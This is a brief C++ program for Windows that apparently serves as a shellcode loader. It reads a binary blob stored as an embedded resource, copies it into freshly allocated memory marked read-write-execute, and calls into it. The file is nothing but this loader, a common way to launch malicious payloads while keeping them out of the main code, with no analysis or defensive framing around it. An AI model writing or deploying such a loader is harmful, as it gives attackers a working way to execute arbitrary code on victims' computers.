#include <iostream>
#include <Windows.h>
#include "resource.h"

#include <shlwapi.h>
#include <TlHelp32.h>

int main()
{
	// load resource
	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_BIN011), L"bin01");
	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
	HGLOBAL shellcodeResourceData = LoadResource(NULL, shellcodeResource);

	// run shellcode
	void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcodeResourceData, shellcodeSize);

	((void(*)())exec)();

	return 0;

}